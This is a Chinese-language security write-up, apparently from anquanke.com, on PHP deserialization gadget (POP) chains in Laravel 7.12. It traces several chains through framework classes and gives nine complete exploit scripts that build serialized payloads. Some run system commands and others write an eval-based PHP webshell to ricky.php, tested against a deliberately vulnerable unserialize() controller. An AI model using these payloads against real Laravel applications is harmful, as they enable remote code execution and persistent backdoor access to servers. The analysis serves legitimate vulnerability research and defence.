> 原文链接: https://www.anquanke.com//post/id/234532 


# Laravel7反序列化POP链分析挖掘


                                阅读量   
                                **123108**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t019694f3612ee6ef02.png)](https://p2.ssl.qhimg.com/t019694f3612ee6ef02.png)



## laravel7 反序列化汇总

测试使用的 Laravel 是通过 composer 默认方法 `composer create-project --prefer-dist laravel/laravel blog "7.12.*"`安装的，如果用到了未默认带的组件会在文中说明 !

安装好后在 routes\web.php 添加路由

```
Route::get('/index', "IndexController@index");
```

然后在 app\Http\Controllers 目录下添加 IndexController.php

```
&lt;?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class IndexController extends Controller
`{`
    public function index(Request $request)
    `{`
        if ($request-&gt;query("data")) `{`
            unserialize($request-&gt;query("data"));
        `}` else `{`
            highlight_file(__FILE__);
            return "Laravel version: " . app()::VERSION;
        `}`
    `}`
`}`
```

php artisan serve 启动服务



## POP链1*

把 laravel5 的反序列化基本过了以后在 phpggc 的laravel反序列库里面找了一个通过修改参数使用的php反序列化点, 主要是通过 [RCE3](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Laravel/RCE/3/gadgets.php) 展开的一次任意命令执行攻击, 然后仍可以应用于 laravel7

应用了 PendingBroadcast 类这个反序列化点

```
public function __destruct()
    `{`
        $this-&gt;events-&gt;dispatch($this-&gt;event);
    `}`
```

参数都可控, 那就行了, 触发`__call()` 函数就行, 在 Illuminate\Notifications\ChannelManager

```
public function __call($method, $parameters)
`{`
    return $this-&gt;driver()-&gt;$method(...$parameters);
`}`
```

跟进driver()方法

```
public function driver($driver = null)
`{`
    $driver = $driver ?: $this-&gt;getDefaultDriver();

    if (is_null($driver)) `{`
        throw new InvalidArgumentException(sprintf(
            'Unable to resolve NULL driver for [%s].', static::class
        ));
    `}`

    // If the given driver has not been created before, we will create the instances
    // here and cache it so we can return it next time very quickly. If there is
    // already a driver created by this name, we'll just return that instance.
    if (! isset($this-&gt;drivers[$driver])) `{`
        $this-&gt;drivers[$driver] = $this-&gt;createDriver($driver);
    `}`

    return $this-&gt;drivers[$driver];
`}`
```

getDefaultDriver方法实现在子类 Manager

```
public function getDefaultDriver()
`{`
    return $this-&gt;defaultChannel;
`}`
```

`$this-&gt;defaultChannel`的值是我们可控的，比如是 null，然后继续回到 driver 方法中，`$this-&gt;drivers` 我们可控，使其进入createDriver方法

```
protected function createDriver($driver)
`{`
    // We'll check to see if a creator method exists for the given driver. If not we
    // will check for a custom driver creator, which allows developers to create
    // drivers using their own customized driver creator Closure to create it.
    if (isset($this-&gt;customCreators[$driver])) `{`
        return $this-&gt;callCustomCreator($driver);
    `}` else `{`
        $method = 'create'.Str::studly($driver).'Driver';


        if (method_exists($this, $method)) `{`
            return $this-&gt;$method();
        `}`
    `}`
    throw new InvalidArgumentException("Driver [$driver] not supported.");
`}`
```

因为这里 `$customCreators` 是我们可控的，所以使if语句成立，进入 callCustomCreator 方法

```
protected function callCustomCreator($driver)
`{`
    return $this-&gt;customCreators[$driver]($this-&gt;container);
`}`
```

这里所有参数均可控可以造成 RCE , 然后构建 pop 链如下, 暂时只能传一个参数

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc1
# @author: Ricky
*/

namespace Illuminate\Broadcasting `{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events) `{`
            $this-&gt;events = $events;
        `}`
    `}`
`}`
// $this-&gt;events-&gt;dispatch($this-&gt;event);

namespace Illuminate\Notifications
`{`
    class ChannelManager
    `{`
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
        `{`
            $this-&gt;container = $parameter;
            $this-&gt;customCreators = ['x' =&gt; $function];
            $this-&gt;defaultChannel = 'x';
        `}`
    `}`
`}`

namespace `{`

    use Illuminate\Broadcasting\PendingBroadcast;
    use Illuminate\Notifications\ChannelManager;

    $b = new ChannelManager('system', 'dir');
    $a = new PendingBroadcast($b);
    echo urlencode(serialize($a));
`}`
```

然后GET传参 `?data=` 反序列化成功

[![](https://p0.ssl.qhimg.com/t01a920d559e6f06eb3.png)](https://p0.ssl.qhimg.com/t01a920d559e6f06eb3.png)



## POP链2*

**新思路: ** 紧接 POP链1, 既然只能传一个参数, 就想到了之前 Yii2 反序列化的类函数调用, 调用 public function 下包含 file_put_contents 且参数可控, 那么这样也就是

```
return $this-&gt;customCreators[$driver]($this-&gt;container);
// call_user_func['x'](new class x(), 'x');
```

call_user_func 传一个参数, 这个参数就是回调函数, 回调的时候访问该类中的其它函数执行, 但是该函数不可以包含任何形参且是 public (protected 和 private 自己自己调用), 也就是形成了调用其它类里不包含形参的任何方法

花了挺长时间的找这个, 在 Illuminate\Auth\RequestGuard.php 中

```
public function user()
    `{`
        // If we've already retrieved the user for the current request we can just
        // return it back immediately. We do not want to fetch the user data on
        // every call to this method because that would be tremendously slow.
        if (! is_null($this-&gt;user)) `{`
            return $this-&gt;user;
        `}`

        return $this-&gt;user = call_user_func(
            $this-&gt;callback, $this-&gt;request, $this-&gt;getProvider()
        );
    `}`
```

这个堪称完美, 参数均可控而且我们可以进行二次调用, 这一次我们可以多传两个参数(也就是 file_put_contents 有可能实现了), 于是全局搜索 public function 包含 file_put_contents 的, 也花了挺久, 在 Illuminate\Filesystem\Filesystem.php 中

```
public function append($path, $data)
    `{`
        return file_put_contents($path, $data, FILE_APPEND);
    `}`
```

又是一个堪称完美的函数, 参数均可控而且调用就直接写入文件, 快狠准! (FILE_APPEND表示可追加写入)

那新的 pop 链就成型了, 这里做个整体总结

```
class PendingBroadcast -&gt; __destruct()
↓↓↓
class ChannelManager -&gt; call() -&gt; driver()
↓↓↓
abstract class Manager -&gt; getDefaultDrive()
↓↓↓
class ChannelManager -&gt; createDriver()
↓↓↓
class ChannelManager -&gt; callCustomCreator()
↓↓↓
class RequestGuard -&gt; user() -&gt; call_user_func()
↓↓↓
class Filesystem -&gt; append() -&gt; file_put_contents()
↓↓↓
剩下就是其它的一些无关紧要的调用

```

建立 exp.php

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc2
# @author: Ricky
# @ability: upload shell
*/

namespace Illuminate\Broadcasting `{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events) `{`
            $this-&gt;events = $events;
        `}`
    `}`
`}`
// $this-&gt;events-&gt;dispatch($this-&gt;event);

namespace Illuminate\Notifications
`{`
    class ChannelManager
    `{`
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
        `{`
            $this-&gt;container = $parameter;
            $this-&gt;customCreators = ['x' =&gt; $function];
            $this-&gt;defaultChannel = 'x';
        `}`
    `}`
`}`

namespace Illuminate\Filesystem `{`
    class Filesystem`{`
        public $path = 'ricky.php';
        public $data = '&lt;?php eval($_POST[ricky]);?&gt;';
    `}`
`}`

namespace Illuminate\Auth `{`
    class RequestGuard `{`
        protected $user;
        protected $callback;
        protected $request = 'ricky.php';
        protected $provider = '&lt;?php eval($_POST[ricky]);?&gt;';
        public function __construct($callback) `{`
            $this-&gt;callback = $callback;
        `}`
    `}`
`}`

namespace `{`

    use Illuminate\Auth\RequestGuard;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\Notifications\ChannelManager;
    use Illuminate\Broadcasting\PendingBroadcast;

    $c = new RequestGuard([new Filesystem(), 'append']);
    $b = new ChannelManager('call_user_func', [$c, 'user']);
    $a = new PendingBroadcast($b);
    echo urlencode(serialize($a));
`}`
```

反序列化成功

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0123f7fd64aa7a1241.png)

**补充:** 全局搜索 `__destruct()` 来找到新的可以触发 `__call` 函数的点, 于是找到了有三个类好用

```
# PendingResourceRegistration
    public function __destruct()
    `{`
        if (! $this-&gt;registered) `{`
            $this-&gt;register();
        `}`
    `}`
# CollectionConfigurator
    public function __destruct()
    `{`
        if (null === $this-&gt;prefixes) `{`
            $this-&gt;collection-&gt;addPrefix($this-&gt;route-&gt;getPath());
        `}`
        if (null !== $this-&gt;host) `{`
            $this-&gt;addHost($this-&gt;collection, $this-&gt;host);
        `}`

        $this-&gt;parent-&gt;addCollection($this-&gt;collection);
    `}`
# ImportConfigurator
    public function __destruct()
    `{`
        $this-&gt;parent-&gt;addCollection($this-&gt;route);
    `}`
```

首先谈一下 ImportConfigurator 类, 其实我一开始最想用的就是这个, 简单而且和 PendingBroadcast 类的 `__destruct()` 长得特别像, 参数均可控, 但是本地开debug调试后提示这个类不能被反序列化就舍弃了, 有用成的师傅可以分享一下心得

其次就是 CollectionConfigurator 类, 也是和上面反馈了一样的情况, 不让反序列化, 所以就只剩下 PendingResourceRegistration 类了, 亲测可用, 然后先跟进函数 register()

```
public function register()
    `{`
        $this-&gt;registered = true;

        return $this-&gt;registrar-&gt;register(
            $this-&gt;name, $this-&gt;controller, $this-&gt;options
        );
    `}`
```

这些参数都可控, 那就行了, 触发`__call()` 函数就行, 剩余步骤就不详细分析了, 直接给出 POP链1 和 POP链2 的翻新

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc3
# @author: Ricky
*/

namespace Illuminate\Routing`{`
    class PendingResourceRegistration`{`
        protected $registrar;
        protected $name;
        protected $controller;
        protected $options;
        public function __construct($registrar, $name, $controller, $options)
        `{`
            $this-&gt;registrar = $registrar;
            $this-&gt;name = $name;
            $this-&gt;controller = $controller;
            $this-&gt;options = $options;
        `}`
    `}`
`}`

namespace Illuminate\Notifications
`{`
    class ChannelManager
    `{`
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
        `{`
            $this-&gt;container = $parameter;
            $this-&gt;customCreators = ['x' =&gt; $function];
            $this-&gt;defaultChannel = 'x';
        `}`
    `}`
`}`

namespace `{`

    use Illuminate\Notifications\ChannelManager;
    use Illuminate\Routing\PendingResourceRegistration;

    $b = new ChannelManager('phpinfo', '-1');
    $a = new PendingResourceRegistration($b, 'ricky', 'ricky', 'ricky');
    echo urlencode(serialize($a));
`}`
```

上传 shell 的 POP链

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc4
# @author: Ricky
# @ability: upload shell
*/

namespace Illuminate\Routing`{`
    class PendingResourceRegistration`{`
        protected $registrar;
        protected $name;
        protected $controller;
        protected $options;
        public function __construct($registrar, $name, $controller, $options)
        `{`
            $this-&gt;registrar = $registrar;
            $this-&gt;name = $name;
            $this-&gt;controller = $controller;
            $this-&gt;options = $options;
        `}`
    `}`
`}`

namespace Illuminate\Notifications
`{`
    class ChannelManager
    `{`
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
        `{`
            $this-&gt;container = $parameter;
            $this-&gt;customCreators = ['x' =&gt; $function];
            $this-&gt;defaultChannel = 'x';
        `}`
    `}`
`}`

namespace Illuminate\Filesystem `{`
    class Filesystem`{`
        public $path = 'ricky.php';
        public $data = '&lt;?php eval($_POST[ricky]);?&gt;';
    `}`
`}`

namespace Illuminate\Auth `{`
    class RequestGuard `{`
        protected $user;
        protected $callback;
        protected $request = 'ricky.php';
        protected $provider = '&lt;?php eval($_POST[ricky]);?&gt;';
        public function __construct($callback) `{`
            $this-&gt;callback = $callback;
        `}`
    `}`
`}`

namespace `{`

    use Illuminate\Auth\RequestGuard;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\Notifications\ChannelManager;
    use Illuminate\Routing\PendingResourceRegistration;

    $c = new RequestGuard([new Filesystem(), 'append']);
    $b = new ChannelManager('call_user_func', [$c, 'user']);
    $a = new PendingResourceRegistration($b, 'ricky', 'ricky', 'ricky');
    echo urlencode(serialize($a));
`}`
```



## POP链3

入口类: `Illuminate\Broadcasting\pendiongBroadcast`

最后RCE调用类：`Illuminate\Bus\Dispatcher`

一开始使用 `__destruct()` 函数直接跟进到 dispatch 方法

```
public function dispatch($command)
    `{`
        if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) `{`
            return $this-&gt;dispatchToQueue($command);
        `}`

        return $this-&gt;dispatchNow($command);
    `}`
```

跟进一下`dispatchToQueue()`方法

```
public function dispatchToQueue($command)
    `{`
        $connection = $command-&gt;connection ?? null;

        $queue = call_user_func($this-&gt;queueResolver, $connection);

        if (! $queue instanceof Queue) `{`
            throw new RuntimeException('Queue resolver did not return a Queue implementation.');
        `}`

        if (method_exists($command, 'queue')) `{`
            return $command-&gt;queue($queue, $command);
        `}`

        return $this-&gt;pushCommandToQueue($queue, $command);
    `}`
```

发现 call_user_func , 想办法利用, `$this-&gt;queueResolver` 和 `$connection` 都可控, 返回 dispatch 跟进一下 commandShouldBeQueued

```
protected function commandShouldBeQueued($command)
    `{`
        return $command instanceof ShouldQueue;
    `}`
```

需要`$command`是一个实现了ShouldQueue接口的对象，全局搜索一下，还挺多的，随便找一个用就可以了，这里用的是`QueuedCommand`类。这样就if判断成功，进入`dispatchToQueue()` , 然后就可以利用了, POP链就形成了

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc5
# @author: Ricky
*/

namespace Illuminate\Broadcasting`{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events, $event) `{`
            $this-&gt;events=$events;
            $this-&gt;event=$event;
        `}`
    `}`
`}`

namespace Illuminate\Foundation\Console `{`
    class QueuedCommand `{`
        public $connection;
        public function __construct($connection) `{`
            $this-&gt;connection = $connection;
        `}`
    `}`
`}`

namespace Illuminate\Bus `{`
    class Dispatcher `{`
        protected $queueResolver;
        public function __construct($queueResolver) `{`
            $this-&gt;queueResolver = $queueResolver;
        `}`
    `}`
`}`

namespace `{`
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Foundation\Console\QueuedCommand('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
`}`
```

反序列化成功

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013bb842decf0b751f.png)

然后利用其它的也可以 (把 laravel 7 所有的继承 ShouldQueue 接口的都列出来了)

exp 1

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc6
# @author: Ricky
*/

namespace Illuminate\Broadcasting`{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events, $event) `{`
            $this-&gt;events=$events;
            $this-&gt;event=$event;
        `}`
    `}`
`}`

namespace Illuminate\Broadcasting `{`
    class BroadcastEvent `{`
        public $connection;
        public function __construct($connection) `{`
            $this-&gt;connection = $connection;
        `}`
    `}`
`}`

namespace Illuminate\Bus `{`
    class Dispatcher `{`
        protected $queueResolver;
        public function __construct($queueResolver) `{`
            $this-&gt;queueResolver = $queueResolver;
        `}`
    `}`
`}`

namespace `{`
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Broadcasting\BroadcastEvent('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
`}`
```

exp 2

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc7
# @author: Ricky
*/

namespace Illuminate\Broadcasting`{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events, $event) `{`
            $this-&gt;events=$events;
            $this-&gt;event=$event;
        `}`
    `}`
`}`

namespace Illuminate\Notifications `{`
    class SendQueuedNotifications `{`
        public $connection;
        public function __construct($connection) `{`
            $this-&gt;connection = $connection;
        `}`
    `}`
`}`

namespace Illuminate\Bus `{`
    class Dispatcher `{`
        protected $queueResolver;
        public function __construct($queueResolver) `{`
            $this-&gt;queueResolver = $queueResolver;
        `}`
    `}`
`}`

namespace `{`
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Notifications\SendQueuedNotifications('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
`}`
```

exp 3

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc8
# @author: Ricky
*/

namespace Illuminate\Broadcasting`{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events, $event) `{`
            $this-&gt;events=$events;
            $this-&gt;event=$event;
        `}`
    `}`
`}`

namespace Illuminate\Queue `{`
    class CallQueuedClosure `{`
        public $connection;
        public function __construct($connection) `{`
            $this-&gt;connection = $connection;
        `}`
    `}`
`}`

namespace Illuminate\Bus `{`
    class Dispatcher `{`
        protected $queueResolver;
        public function __construct($queueResolver) `{`
            $this-&gt;queueResolver = $queueResolver;
        `}`
    `}`
`}`

namespace `{`
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Queue\CallQueuedClosure('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
`}`
```

exp 4

```
&lt;?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc9
# @author: Ricky
*/

namespace Illuminate\Broadcasting`{`
    class PendingBroadcast `{`
        protected $events;
        protected $event;
        public function __construct($events, $event) `{`
            $this-&gt;events=$events;
            $this-&gt;event=$event;
        `}`
    `}`
`}`

namespace Illuminate\Events `{`
    class CallQueuedListener `{`
        public $connection;
        public function __construct($connection) `{`
            $this-&gt;connection = $connection;
        `}`
    `}`
`}`

namespace Illuminate\Bus `{`
    class Dispatcher `{`
        protected $queueResolver;
        public function __construct($queueResolver) `{`
            $this-&gt;queueResolver = $queueResolver;
        `}`
    `}`
`}`

namespace `{`
    $c = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Events\CallQueuedListener('dir');
    $a = new Illuminate\Broadcasting\PendingBroadcast($c, $b);
    echo urlencode(serialize($a));
`}`
```



## 总结

相比 laravel 5.8, 可以利用的反序列化链变少了, 但是核心思路没有变, 还是通过 `__destruct()` 触发 `__call` 或者 `__invoke` 函数, 再通过 `call_user_func` 或 `call_user_func_array` 进行函数回调达成 RCE
